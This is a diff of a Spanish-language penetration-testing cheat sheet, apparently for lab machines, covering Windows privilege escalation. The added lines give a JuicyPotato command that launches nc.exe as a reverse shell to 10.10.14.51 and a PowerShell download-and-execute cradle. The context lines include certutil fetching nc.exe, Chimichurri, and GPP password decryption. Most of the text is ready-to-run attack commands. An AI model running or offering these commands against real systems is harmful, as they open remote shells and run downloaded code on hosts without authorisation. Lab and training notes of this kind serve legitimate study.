@@ -174,6 +174,11 @@ Se puede escalar privilegios, previa subida de JuicyPotato.exe y nc.exe:
 JP.exe -t * -l 1337 -p c:\windows\system32\cmd.exe -a "/c c:\\windows\temp\privescnc.exe -e cmd 10.10.14.51 4446"
 </pre>
 
+Cambiando el CLSI en base al operativo:
+
+<pre>
+.\JP.exe -t * -p c:\windows\system32\cmd.exe -l 1337 -a "/c c:\\windows\temp\privesc\nc.exe -e cmd 10.10.14.51 443" -c "{5B3E6773-3A99-4A3D-8096-7765DD11785C}"
+</pre>
 #### Chimichurry
 Otra vía es **Chimichurri**, aunque a veces no va.
 
@@ -188,13 +193,18 @@ Chimichurri.exe 10.10.14.51 4446
 certutil.exe -f -urlcache -split http://10.10.14.51/nc.exe nc.exe
 </pre>
 
+### Subir y ejecutar con POWERSHWLL
+
+<pre>
+powershell IEX (New-Object Net.WebClient).DownloadString('"'http://10.10.14.51:8000/PS.ps1')
+</pre>
 ### Enumerar SYSVOL
 
 Si se puede enumerar SYSVOL hay que buscar el ficehro Groups.txt, (Policies/xxxx/MACHINE/Preferences/Group).
 Como microsoft publicó la clave de desencriptación se puede utilizar **gpp-decript**.
 
 <pre>
-gpp-decrypt 'CONTRASEÑAEMCRIPTADA'
+gpp-decrypt 'CONTRASEÑAENCRIPTADA'
 </pre>
 
 ### Sincronizar reloj
